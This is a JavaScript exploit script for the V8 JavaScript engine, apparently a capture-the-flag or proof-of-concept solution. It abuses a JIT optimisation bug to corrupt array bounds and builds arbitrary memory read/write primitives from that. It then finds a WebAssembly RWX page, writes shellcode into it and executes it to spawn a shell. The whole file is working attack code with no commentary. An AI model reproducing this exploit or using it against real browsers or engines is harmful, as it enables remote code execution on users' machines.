length_as_double = new Float64Array(new BigUint64Array([0x7ffffffe00000001n]).buffer)[0];

var buf=new ArrayBuffer(8);
var f64_buf=new Float64Array(buf);
var u64_buf=new Uint32Array(buf);

function gc() {
    for (var i = 0; i < 0x10000; ++i)
        var a = new ArrayBuffer();
}

function ftoi(val){
    f64_buf[0]=val;
    return BigInt(u64_buf[0])+(BigInt(u64_buf[1])<<32n);
}

function itof(val){
    u64_buf[0]=Number(val&0xffffffffn);
    u64_buf[1]=Number(val>>32n);
    return f64_buf[0];
}

function hex(val){
    return "0x" + val.toString(16)
}

function lo32(val){
    return val&0xffffffffn;
}

function hi32(val){
    return val >> 32n;
}

function CAW(base, victim, value, size){

    idx = Number((victim - base) / 0x8n);
    if (idx < 0 && Number(victim - base) % 0x8)
        idx -= 1;

    if(size == 8) {
        if (Number(victim - base) % 0x8) {
            oob[idx] = itof(lo32(ftoi(oob[idx])) + (lo32(value) << 32n));
            oob[idx+1] = itof(hi32(value) + (hi32(ftoi(oob[idx+1])) << 32n));
        }
        else
            oob[idx] = itof(value);
    }

    else if(size == 4) {
        if (Number(victim - base) % 0x8)
            oob[idx] = itof(lo32(ftoi(oob[idx])) + (value << 32n));
        else
            oob[idx] = itof(value + hi32(ftoi(oob[idx])) << 32n);
    }
    
}

function CAR(base, victim, size){

    idx = Number((victim - base) / 0x8n);
    if (idx < 0 && Number(victim - base) % 0x8)
        idx -= 1;

    if (size == 8) {
        if (Number(victim - base) % 0x8)
            return hi32(ftoi(oob[idx])) + (lo32(ftoi(oob[idx+1])) << 32n);
        else
            return ftoi(oob[idx]);
    }

    else if(size == 4) {
        if (Number(victim - base) % 0x8)
            return hi32(ftoi(oob[idx]));
        else
            return lo32(ftoi(oob[idx]));
    }
}

function scan_memory(possible_address, target, size){
    offsets = []
    for(let i=0; i<possible_address.length; i++)
        for(let j = possible_address[i][0]; j < possible_address[i][1] - 0x10; j+=size)
            if(CAR(8n, BigInt(j), size) == target)
                offsets.push(j);
    
    return offsets;
}

array = Array(0x40000).fill(1.1);
args = Array(0x100 - 1).fill(array);
args.push(Array(0x40000 - 4).fill(2.2));
giant_array = Array.prototype.concat.apply([], args);
giant_array.splice(giant_array.length, 0, 3.3, 3.3, 3.3);

let arraybuf = new ArrayBuffer(0x13337);
let view = new DataView(arraybuf);
view.setBigUint64(0, 0xdeadbeefcafebaben);

gc();
gc();

function trigger(array) {
    var x = array.length;
    x -= 67108861;
    x = Math.max(x, 0);
    x *= 6;
    x -= 5;
    x = Math.max(x, 0);
    let corrupting_array = [0.1, 0.1];
    let corrupted_array = [0.1];
    corrupting_array[x] = length_as_double;
    return [corrupting_array, corrupted_array];
}

%PrepareFunctionForOptimization(trigger);
trigger(giant_array);
%OptimizeFunctionOnNextCall(trigger);
trigger(giant_array);

var oob = trigger(giant_array)[1];

var possible_address = [[0x8200000, 0x8280000], [0x83c0000, 0x86c1000], [0x8700000, 0x8910000]]

let possible_arraybuf_addr = scan_memory(possible_address, 0x13337n, 4);
print("[+] possible_arraybuf_address: " + possible_arraybuf_addr);

let arraybuf_backingptr_address;

for(let i=0; i<possible_arraybuf_addr.length; i++)
{
    possible_arraybuf_addr[i] = possible_arraybuf_addr[i];
    if((CAR(8n, BigInt(possible_arraybuf_addr[i]+0xc), 4n)&0x00007f00n) == 0x00007f00n)
        arraybuf_backingptr_address = BigInt(possible_arraybuf_addr[i]+0x10-8);
}

if (arraybuf_backingptr_address == undefined)
{
	throw new Error("Not found");
}

print("[+] arraybuf_idx: " + hex(arraybuf_backingptr_address));
%DebugPrint(arraybuf);

function AAR(address){
    var view = new DataView(arraybuf);
    CAW(8n, arraybuf_backingptr_address, address, 8n);
    return view.getBigUint64(0, true);
}

function AAW(address, value){
    var view = new DataView(arraybuf);
    CAW(8n, arraybuf_backingptr_address, address, 8n);
    return view.setBigUint64(0, value, true);
}

var wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 2, 1, 0, 7, 9, 1, 5, 115, 104, 101, 108, 108, 0, 0, 10, 4, 1, 2, 0, 11]);
var mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(mod);
var shell = wasm_instance.exports.shell;
var obj_array = [1337332, wasm_instance, 1337332, wasm_instance];

shell();

const shellcode = [0x91969dd1bb48c031n, 0x53dbf748ff978cd0n, 0xb05e545752995f54n, 0x9090909090050f3bn];

gc();
gc();

let possible_obj_array_elem_address = scan_memory(possible_address, 1337332n<<1n, 4);
let wasm_instance_addr_ptr;
print("[+] possible_obj_array address: " + possible_obj_array_elem_address);

%DebugPrint(obj_array);
for(let i=0; i<possible_obj_array_elem_address.length-1; i++)
    if(possible_obj_array_elem_address[i]+0x8 == possible_obj_array_elem_address[i+1])
        wasm_instance_addr_ptr = BigInt(possible_obj_array_elem_address[i]+0x4);

%DebugPrint(wasm_instance);
let wasm_instance_addr = CAR(8n, wasm_instance_addr_ptr, 4) - 1n;
if (wasm_instance_addr == -1)
{
	throw new Error("Not found");
}

print("[+] wasm_instance_addr_ptr address: " + hex(wasm_instance_addr_ptr));
print("[+] wasm_instance address: " + hex(wasm_instance_addr));

let rwx_page = CAR(8n, wasm_instance_addr+0x68n, 8)
print("[+] rwx_page address: " + hex(rwx_page))

for(let i=0; i<shellcode.length; i++)
    AAW(rwx_page+(BigInt(i) * 8n), shellcode[i]);
shell();
